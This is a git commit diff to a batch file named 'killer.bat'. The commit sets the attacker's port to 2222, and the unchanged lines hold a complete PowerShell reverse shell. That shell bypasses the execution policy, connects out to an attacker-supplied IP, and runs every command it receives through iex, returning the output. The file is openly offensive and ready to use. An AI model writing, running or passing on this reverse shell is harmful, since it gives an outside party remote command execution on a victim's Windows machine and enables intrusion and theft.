46500d8b74ee81abbb6befb39e42febd745b9bd6
bhartendragit <bhartendra2507@gmail.com>
2024-09-22 16:01:50 +0530

    Update killer.bat

--- killer.bat
+++ killer.bat
@@ -3,7 +3,7 @@
 set attackerIP=%1
 
 :: Set the attacker's port manually
-set attackerPort=<PORT>
+set attackerPort=2222
 
 :: Establish a reverse connection using PowerShell
 powershell -NoProfile -ExecutionPolicy Bypass -Command "& { $client = New-Object System.Net.Sockets.TCPClient('%attackerIP%', %attackerPort%); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() }; $client.Close() }"
